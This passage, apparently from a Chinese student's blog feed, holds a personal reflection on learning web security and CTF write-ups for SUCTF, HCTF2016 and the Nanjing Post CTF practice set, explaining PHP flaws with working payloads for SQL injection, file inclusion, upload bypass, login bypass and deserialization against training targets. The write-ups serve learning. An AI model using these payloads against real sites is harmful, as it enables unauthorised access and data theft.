      <content type="html"><![CDATA[<p>不知不觉都入坑半年多了<br><a id="more"></a><br>　　想想自己学了些什么也想不出来我好辣鸡啊，大学也就剩两年了，真是的要给自己一个规划了，感觉在这样每天突然神经的学一点，又突然不知道自己该干什么，入门的时候学长就说Web知识很多很杂，自己后来也是感觉到了要学的东西好多好多啊<br>　　说说自己干了些什么吧,最开始学了一阵子的Python跟着廖雪峰的网站差不多学了有一半吧，突然就扔那不学了，自己感觉就是跟c++差不多其实自己c++也是辣鸡，然后又学了学sqli-labs,感觉也是学了个半成不成的扔那了，虽然说sqlmap要比手工注入厉害很多可自己也不想当一个脚本小子啊，又参加了一些大大小小的ctf比赛，除了suctf，跟极客大挑战这样的招新赛，其他的比赛简直是被虐的想哭，没什么好说的就是菜，说实话感觉自己的时间真的不是很多了，大四的时候自己又能在哪呢，真的是挺想去安恒实习的，是要有一个规划了<br><img src="http://p1.bqimg.com/567571/c53ed88392e37831.jpg" alt=""><br>　　下周就要比赛了，今天学长跟另外一个组的同学说，好好复习应该能拿个一等奖吧，是啊自己努力不努力别人也是看的见的，一等奖2333，下下周还有一个校内赛自己也要努力呀，好好规划一下吧</p>
<pre><code>自己的代码审计能力确实很弱，php学的都不够好，当时想的php辣么多函数自己也记不完，现在想想一定要提前去了解那些函数尤其是危险函数。
Python爬虫也不是很会写，最近也只是在极客大挑战中写了一个及其简单的小脚本，编码能力还是很重要的。
有ctf比赛就要参加，虽然会被虐哭= =，比赛结束也要好好总结不足与进步。
sql注入 XSS什么的也都要靠自己平时的积累。
</code></pre><p>　　自己文笔还是差的要死，毕竟高中语文都是不及格。<br>　　后排艾特碧连天小队队员@咯咯@c-m要一起努力呀！</p>
]]></content>
      
        <categories>
            
            <category> 总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF知识点总结]]></title>
      <url>http://isron.cn/2016/11/14/CTF_sum/</url>
      <content type="html"><![CDATA[<p>长期更新，用于总结在CTF中遇到的自己没想到的知识点<br><a id="more"></a></p>
<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p> 通过F12修改网页前端代码使不可提交的按钮变为可提交的按钮</p>
<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p> 再次复习了一次关于MD5值0e开头的问题</p>
<h3 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h3><p> 越权读取文件</p>
<h3 id="你是谁？你从哪里来？"><a href="#你是谁？你从哪里来？" class="headerlink" title="你是谁？你从哪里来？"></a>你是谁？你从哪里来？</h3><p> 学习到了referer与Origin头的区别以及X-Forwarded-For的应用</p>
<pre><code>origin：主要是用来说明最初请求是从哪里发起的
Referer：代表当前访问URL的上一个URL
X-Forwarded-For：访问者的ip
</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Forensic-100"><a href="#Forensic-100" class="headerlink" title="Forensic-100"></a>Forensic-100</h3><p> Linux下file命令的使用：file:用来识别文件类型，也可用来辨别一些文件的编码格式<br> Linux下gzip文件的解压方法：</p>
<pre><code>gzip：压缩文件，并删除原始文件
gzip -v：压缩文件，并显示压缩信息
gunzip：解压文件，gunzip == gzip -d
zcat：不解压而显示压缩文件的内容
</code></pre><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><p> RSA加密还在研究中= =</p>
<h3 id="普莱费尔"><a href="#普莱费尔" class="headerlink" title="普莱费尔"></a>普莱费尔</h3><p> 学习到了普莱费尔密码，第一次接触…<a href="http://rumkin.com/tools/cipher/playfair.php" target="_blank" rel="external">在线解密</a></p>
<h1 id="第二届上海市大学生网络安全大赛"><a href="#第二届上海市大学生网络安全大赛" class="headerlink" title="第二届上海市大学生网络安全大赛"></a>第二届上海市大学生网络安全大赛</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="仔细"><a href="#仔细" class="headerlink" title="仔细"></a>仔细</h3><p>日志查看题目，第一次遇到= =通过扫描查到有log路径，发现存在日志泄露</p>
<h3 id="跳"><a href="#跳" class="headerlink" title="跳"></a>跳</h3><p>当时做的时候只是看到存在token而且会三秒一跳，无奈只注意到了id=1便以为是注入，想了好久，依然需要扫描发现存在admin.php路径，带着之前的token去访问admin.php，突然感觉到了扫描工具也是很必要的，以及对token的使用</p>
<h3 id="物超所值"><a href="#物超所值" class="headerlink" title="物超所值"></a>物超所值</h3><p>当时想的是修改前台的js验证，到了购买的时候发现出错了= =，当时也没想着再去抓包看下，看完write up才发现原来在SHOP NOW的时候还会提交一个POST数据= =，还是不够细心。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于前面几个题目被虐哭后面也就没做了= =，发现这个是最简单的题目其实都是那一点套路。</p>
<h3 id="威胁1"><a href="#威胁1" class="headerlink" title="威胁1"></a>威胁1</h3><p>直接密码爆破</p>
<h3 id="威胁2"><a href="#威胁2" class="headerlink" title="威胁2"></a>威胁2</h3><p>依然是扫描扫描扫描，哎，真的要学着去利用扫描工具了= =。</p>
<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="大可爱"><a href="#大可爱" class="headerlink" title="大可爱"></a>大可爱</h3><p>自己做的时候用binwalk查到了里面包含一个zlib文件，可怎么也提取不出来，原来是自己会的姿势太少了= =<br>目前学习到的提取文件命令：<code>binwalk -e</code>,<code>dd</code>,<code>foremost</code></p>
<h1 id="HCTF2016"><a href="#HCTF2016" class="headerlink" title="HCTF2016"></a>HCTF2016</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>很明显我第一层都没过去，看完write up感觉自己还是太年轻…</p>
<h3 id="MISC签到"><a href="#MISC签到" class="headerlink" title="MISC签到"></a>MISC签到</h3><p>通过追踪TCP流可以发现一系列的linux命令，以及一个Python代码：</p>
<pre><code>#!/usr/bin/env python
# coding:utf-8
__author__ = &apos;Aklis&apos;
from Crypto import Random
from Crypto.Cipher import AES
import sys
import base64
def decrypt(encrypted, passphrase):
    IV = encrypted[:16]
    aes = AES.new(passphrase, AES.MODE_CBC, IV)
    return aes.decrypt(encrypted[16:])
def encrypt(message, passphrase):
    IV = message[:16]
    length = 16
    count = len(message)
    padding = length - (count % length)
    message = message + &apos;\0&apos; * padding
    aes = AES.new(passphrase, AES.MODE_CBC, IV)
    return aes.encrypt(message)
IV = &apos;YUFHJKVWEASDGQDH&apos;
message = IV + &apos;flag is hctf{xxxxxxxxxxxxxxx}&apos;
print len(message)
example = encrypt(message, &apos;Qq4wdrhhyEWe4qBF&apos;)
print example
example = decrypt(example, &apos;Qq4wdrhhyEWe4qBF&apos;) 
print example
</code></pre><p>以及</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cat</span> flag </div><div class="line">mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==</div></pre></td></tr></table></figure>
<p>看懂的话其实就是一个加密函数一个解密函数将flag在代码里面base64解密然后再进行一次decrypt即可。</p>
<h3 id="IOS99"><a href="#IOS99" class="headerlink" title="IOS99"></a>IOS99</h3><p>改User Agent头信息，改为ios99发现怎么都不对，看完源码才知道是需要一个完整的User Agent头信息<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A344 Safari/601.1</span></div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/iPhone;\ CPU\ iPhone\ OS\ 99\ like\ Mac\ OS\ X/i'</span>, $ua) &amp;&amp; preg_match(<span class="string">'/Mozilla\/5\.0/i'</span>, $ua) &amp;&amp; </div><div class="line">	preg_match(<span class="string">'/AppleWebKit/i'</span>, $ua) &amp;&amp; preg_match(<span class="string">'/Safari/i'</span>, $ua)) &#123;</div><div class="line"></div><div class="line">	echo <span class="string">'&lt;!-- flag not in html... --&gt;'</span>;</div><div class="line">	<span class="keyword">header</span>(<span class="string">'flag: hctf&#123;h77p_He4dEr_50_E4sy&#125;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>进行了正则匹配</p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="RESTFUL"><a href="#RESTFUL" class="headerlink" title="RESTFUL"></a>RESTFUL</h3><p>通过F12可以查看到有一个XHR请求flag然后根据回显信息利用PUT型请求以及restful格式的参数赋值得到flag。<br>XHR必须要有<code>X-Requested-With:XMLHttpRequest</code>请求信息<br><img src="http://i1.piimg.com/567571/ad8a7745aea3f09f.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[南邮CTF]]></title>
      <url>http://isron.cn/2016/11/09/nanyou/</url>
      <content type="html"><![CDATA[<p>南邮涉及了那么多知识点，怎么能不总结一下呢。<br><a id="more"></a></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看源代码得到flag</p>
<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>由题目可知为MD5碰撞然而发现考的是php语言的特性<br>源码：</p>
<pre><code>&lt;?php
$md51 = md5(&apos;QNKCDZO&apos;); //对QNKCDZO进行MD5加密
$a = @$_GET[&apos;a&apos;];  //GET方式传入a值
$md52 = @md5($a);  //对a值进行MD5加密
if(isset($a)){
if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { //如果a不等于QNKCDZO且MD5值相等输出flag
    echo &quot;nctf{*****************}&quot;;
} else {
    echo &quot;false!!!&quot;;
}}
else{echo &quot;please input a&quot;;}
?&gt;
</code></pre><p>百度一下QNKCDZO可以得到:</p>
<pre><code>md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;)
md5(&apos;240610708&apos;) = 0e462097431906509019562988736854
md5(&apos;QNKCDZO&apos;) = 0e830400451993494058024219903391
</code></pre><p>PHP在进行==运算时如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行两个字符串恰好以 0e 的科学记数法开头，字符串被隐式转换为浮点数，实际上也就等效于 0×10^0 ，因此比较起来是相等的。<br>PHP中的Hash校验，应该使用“===”，而不应该使用“==”。</p>
<h3 id="签到题2"><a href="#签到题2" class="headerlink" title="签到题2"></a>签到题2</h3><p><img src="http://tuku02-qn.icp114.cn/public/16-11-9/24630102.jpg" alt=""><br>需要输入口令zhimakaimen发现并不行F12查看一下发现最大长度为10改下JS限制为20输入口令得到flag</p>
<h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>进去就一个图片，然后把图片保存保存一下用记事本打开，搜索一下nctf得到flag</p>
<h3 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h3><p>打开查看一下源代码，发现有一个SO.html点开发现还有so.html，一直点击最后有一个404.html得到flag</p>
<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>JS代码 用firebug，F12运行一下得到flag</p>
<h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>利用burpsuite抓包发现有一个search_key.php放到repeater内go一下得到flag。</p>
<h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>根据题目可知需要从google里来才能得到flag根据抓包修改下referer头为www.google.com得到flag</p>
<pre><code>Referer：代表当前访问URL的上一个URL
</code></pre><h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>源码：</p>
<pre><code>&lt;?php
function CLsI($ZzvSWE) { //定义一个CLsI函数
    $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); //对传入的值进行两次解密处理
    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {
        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
    }
    return $ZzvSWE;
}eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;
</code></pre><p>在本地进行模拟测试时发现eval并不能运行</p>
<pre><code>eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。
</code></pre><p>所以eval只是运行了一下CLsI函数并没有结果返回 在CLsI中return 的值也没办法接收，所以有两种解决方法：</p>
<ol>
<li>将eval改成echo运行并输出最后处理过的结果</li>
<li>将CLsI中的return改为echo直接输出结果</li>
</ol>
<p>顺便写一下gzinflate函数与base64_decode联合处理的方法以及反处理</p>
<pre><code>base64_decode(): base64解码
gzuncompress(): 解压缩字符串    

base64_encode(): base64编码
gzcompress(): 压缩字符串    
</code></pre><p>所以可以反处理为：</p>
<pre><code>base64_encode(gzcompress($ZzvSWE)
</code></pre><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>普及一下文件包含漏洞产生的原因：</p>
<pre><code>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。
</code></pre><p>查看URL可知传入了一个show.php文件那么我们可以用普通的远程文件包含，利用php流的filter去进行文件包含获取他base64编码后的源码</p>
<pre><code>?file=php://filter/convert.base64-encode/resource=index.php
</code></pre><p>当然文件包含不止这一种方法，在以后的学习中会进行更新</p>
<h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>很明显之前的方法以及不能用了，那么就用firebug查看一下HTTP协议进行的过程，发现有两个请求头与响应头，在第二个响应头里有flag。<a href="https://clearloveqaq.github.io/2016/11/08/http%E5%8D%8F%E8%AE%AE/" target="_blank" rel="external">HTTP协议</a></p>
<h3 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h3><p>查看源代码可以得到</p>
<pre><code>download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot;
</code></pre><p>url为歌曲xingxingdiandeng.mp3 base64编码之后的内容那么想到去任意下载得到index.php的源码发现是拒绝的那么换个思路去download.php的源码得到其源码发现还有一个hereiskey.php文件继续下载得到flag。</p>
<pre><code>在页面具有下载功能的时候，有时会因为权限控制不足，导致任意下载漏洞出现。
</code></pre><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>抓包修改Cookie值得到flag</p>
<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>Do you know robots.txt？</p>
<pre><code>在CTF比赛中，robots.txt文件往往存放着提示信息，或者相关源码
</code></pre><p>访问robots.txt得到TIP：sql.php以及sql.php的源码：</p>
<pre><code>&lt;?php
if($_GET[id]) {
    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $id = intval($_GET[id]);
    $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));
    if ($_GET[id]==1024) {
      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
    }
    else{
    echo($query[content]);
    }
  }
?&gt;
</code></pre><p>这个题目的主要在于intval()函数：</p>
<pre><code>intval()：可将变量转成整数类型
</code></pre><p>也就是说输入一个id值将其转换为int型由于不能为1024，那么：</p>
<pre><code>intval(1024.1)=1024
</code></pre><p>所以可以用1024.1进行绕过得到flag</p>
<h3 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h3><p>输入id=1’发现单引号被转义了可以想到是经典的宽字节注入<a href="https://clearloveqaq.github.io/2016/10/15/sql%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">sql注入绕过</a><br>payload:<br>查询全部的表名：</p>
<pre><code>http://115.28.150.176/sqli/index.php?id=1%df&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+
</code></pre><p>查询全部的列名：</p>
<pre><code>http://115.28.150.176/sqli/index.php?id=1%df&apos; union select group_concat(column_name),2 from information_schema.columns where table_schema=database() --+
</code></pre><p>查询fl4g的内容：</p>
<pre><code>http://115.28.150.176/sqli/index.php?id=1%df&apos; union select fl4g,2 from flag--+
</code></pre><h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>根据题目名字想到00截断<br>源码：</p>
<pre><code>if (isset ($_GET[&apos;nctf&apos;])) {
        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)  //输入必须为数字
            echo &apos;必须输入数字才行&apos;;
        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   //如果在nctf里面不能匹配到#biubiubiu返回false
            die(&apos;Flag: &apos;.$flag);
        else
            echo &apos;骚年，继续努力吧啊~&apos;;
    }
</code></pre><p>payload：</p>
<pre><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu
</code></pre><p>%00会被url解码为0x00所以会截断2后面的值但后面内容是真实存在的所以可以被strpos函数匹配到，然后%23url解码为#得到flag</p>
<pre><code>strpos()：查找字符在字符串中第一次出现的位置
</code></pre><h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>源码：</p>
<pre><code>if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) {
if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])
if (md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;]))
die(&apos;Flag: &apos;.$flag);
else
print &apos;Wrong.&apos;;
}
</code></pre><p>GET传入两个值，值不相等,MD5却相等那么可以用数组进行绕过：<br>a[] = 2和b[]= 3相比较，可以跳过第一个判断，而如果使用md5对一个数组进行加密，返回的将是NULL，NULL===NULL，这是成立的，所以构造两个数组，得到flag<br>payload:</p>
<pre><code>http://chinalover.sinaapp.com/web17/index.php?a[]=2&amp;b[]=3
</code></pre><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>首页有一个source.php点进去得到一段比较有用的php代码：</p>
<pre><code>&lt;?php 
if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
extract($_POST);
if ($pass == $thepassword_123) { 
    echo $theflag;
    }
?&gt;
</code></pre><p>根据代码可知当传入的值等于thepassword_123的值时输出flag而POST数据是用extract函数进行传输的。</p>
<pre><code>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。
</code></pre><p>当变量用于指向已有的同名元素中时，extract函数默认的方式是如有冲突，覆盖已有变量，这样也就存在着变量覆盖的漏洞。<br>payload：</p>
<pre><code>pass=&amp;thepassword_123=&amp;4
</code></pre><p>在extract传入值时由于变量thepassword_123本身有一个默认值，现又将它赋值给4所以extract默认的方式是进行覆盖，也就让$pass == $thepassword_123成立，输出flag。</p>
<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p>依然是非常暴力的给出了源码：</p>
<pre><code>&lt;?php
if(eregi(&quot;hackerDJ&quot;,$_GET[id])) {
    echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
    exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;hackerDJ&quot;)
{
    echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
    echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;
}
?&gt;
</code></pre><p>如果id等于hackerDJ的时候输出flag但是在判断之前会先进行一次url解码由于会默认进行一次url编码所以需要对h进行两次url编码但是在对字母进行url编码时发现并没有变化，然后只能手动查找<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="external">HTML URL 编码</a><br>得到h为%68再进行一次url编码为%2568<br>payload：</p>
<pre><code>http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ
</code></pre><h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>进去发现必须是本地登录直接抓包把X-Forwarded-For改为127.0.0.1即可伪装为本地登录</p>
<pre><code>X-Forwarded-For：访问者的ip
</code></pre><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>F12Firebug查看下响应头信息得到flag</p>
<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>刚开始的想法是利用00截断进行上传，发现行不通，最后看了这篇文章才做出来<a href="http://www.cnblogs.com/hack0ne/p/4603144.html" target="_blank" rel="external">上传绕过</a>，主要是这段代码：</p>
<pre><code>&lt;% 
path=&quot;upfiles/picture/&quot; 
file=&quot;XXX.jpg&quot; 
upfilename=path &amp; file &apos;最后的上传地址 
%&gt;
</code></pre><p><img src="http://yotuku.cn/link?url=4183SlTgM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=89aee7bc-c11d-4c04-8f46-67bec8ffa7a7&amp;tk_time=2016111013" alt=""><br>/uploads/也就是上面代码的path部分，1.jpg就是file部分，如果不进行操作，最后的上传地址应该是/uploads/1.jpg，现在这个path地方我们是可以控制的，那么我们可以利用00截断将其上传地址修改为/uploads/1.php%00，最后的上传地址也就变成了/uploads/1.php%001.jpg，遵循从后往前验证，从前往后解析的规则，在验证的时候也就变成了1.jpg，而解析的时候则由于00截断解析为了1.php，从而绕过验证，得到flag。</p>
<h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>得到源码直接上sql语句：</p>
<pre><code>$sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;
</code></pre><p>发现是引号加括号的包裹形式直接万能密码得到flag<br>payload：</p>
<pre><code>user=admin&apos; )or 1=1 #&amp;pass=Password
</code></pre><h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>依然是简单粗暴的源码：</p>
<pre><code>&lt;?php
$pass=@$_POST[&apos;pass&apos;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo &quot;flag:nctf{*}&quot;;
}else{
echo &quot;the pass is wrong!&quot;;
}
}else{
echo &quot;please input pass!&quot;;
}
?&gt;
</code></pre><p>很简单啦，根据strcmp特性strcmp(array,string)=null=0所以直接post一个数组进去得到flag<br>payload：</p>
<pre><code>pass[]=1
</code></pre><h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>源码：<br>    &lt;?php<br>     function noother_says_correct($number)<br>    {<br>            $one = ord(‘1’);<br>            $nine = ord(‘9’);<br>            for ($i = 0; $i &lt; strlen($number); $i++)<br>            {<br>                    $digit = ord($number{$i});<br>                    if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )<br>                    {<br>                            return false;<br>                    }<br>            }<br>                   return $number == ‘54975581388’;<br>    }<br>    $flag=’<strong><em>*</em></strong>‘;<br>    if(noother_says_correct($_GET[‘key’]))<br>        echo $flag;<br>    else<br>        echo ‘access denied’;<br>    ?&gt;<br>由于过滤了数字那么就用十六进制代替54975581388=0xccccccccc<br>payload：</p>
<pre><code>http://chinalover.sinaapp.com/web12/index.php?key=0xCCCCCCCCC
</code></pre><h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>题目说让重置admin的密码然后先试一下发现url返回一段user1=Y3RmdXNlcg== base64解码之后就是ctfuser的原文，那么将admin base64编码一下，并且将user改为admin得到flag<br>payload：</p>
<pre><code>http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4=
user=admin&amp;newpass=11&amp;vcode=1234
</code></pre><h3 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h3><p>源码：</p>
<pre><code>&lt;?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET[&apos;pass&apos;])) {
    $pass = $_GET[&apos;pass&apos;];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass);

    if ($o) {
        $o-&gt;secret = &quot;*&quot;;
        if ($o-&gt;secret === $o-&gt;enter)
            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
        else 
            echo &quot;Oh no... You can&apos;t fool me&quot;;
    }
    else echo &quot;are you trolling?&quot;;
}
?&gt;
</code></pre><p>重点是</p>
<pre><code>unserialize(): 将已序列化的字符串还原回 PHP 的值
serialize(): 对字符串进行序列化
</code></pre><p>并且$o-&gt;secret === $o-&gt;enter，可以利用传参的特点使$o-&gt;secret恒等与$o-&gt;enter<br>写如下代码：</p>
<pre><code>&lt;?php
class just4fun {
    var $enter;
    var $secret;
}
$c=new just4fun();
$c-&gt;enter=&amp;$c-&gt;secret;
echo serialize($c);
?&gt;    
</code></pre><p>输出为 O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}<br>提交得到flag</p>
<h3 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h3><p>重要源码：</p>
<pre><code>$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;
</code></pre><p>将被转义的\’去除得到为：</p>
<pre><code>$query=&apos;SELECT * FROM users WHERE name=&apos;.$username.&apos; AND pass=&apos;.$password.&apos;;
</code></pre><p>输入name=admin tip为反斜杠进行转义那么就构造如下payload：</p>
<pre><code>admin\&amp;password=or 1=1 #
</code></pre><p>查询语句也就变为：</p>
<pre><code>$query=&apos;SELECT * FROM users WHERE name=&apos;admin AND pass=&apos;or 1=1 #&apos;;
</code></pre><p>发现返回错误，然后进行url编码绕过</p>
<pre><code>admin\&amp;password=or 1=1 %23
</code></pre><p>得到flag</p>
<h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>tip：bash<br>进去得到一堆JS代码，F12运行得到1bc29b36f623ba82aaf6724fd3b16718.php<br>访问一下得到再得到一个<br>tip：history of bash<br>查询一下得到<a href="http://www.cnblogs.com/h2-database/archive/2012/07/04/2583318.html" target="_blank" rel="external">linux查看命令行历史记录</a>然后得到一个flagbak.zip 下载得到flag</p>
<h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>源码：</p>
<pre><code>&lt;?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
   mysql_select_db(SAE_MYSQL_DB);
   $user = $_POST[user];  //传入user值
   $pass = md5($_POST[pass]);  //对传入的pass值进行md5加密
   $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));
   if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
    echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;;
   }
   else {
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
  }
}
?&gt;
</code></pre><p>很明显注入语句只有一个：</p>
<pre><code>$query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));
mysql_query() 函数执行一条 MySQL 查询。
mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有
</code></pre><p>那么传入一个user=z’ union select 1 #查询语句变为</p>
<pre><code>select pw from ctf where user=&apos;z&apos; union select 1 #&apos;
</code></pre><p>那么也就是说返回了一个数组为[z,1]，在进行strcasecmp比较时只要数组里面的值跟$pass相等即可，由于$pass进行过一次md5加密那么我们构造如下payload：</p>
<pre><code>user=z&apos; union select md5(1) #&amp;pass=1
</code></pre><p>得到flag</p>
<h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="女神"><a href="#女神" class="headerlink" title="女神"></a>女神</h3><p>记事本打开搜nctf</p>
<h3 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h3><p>将后缀改为zip得到一个压缩包里面还有一个图片得到flag</p>
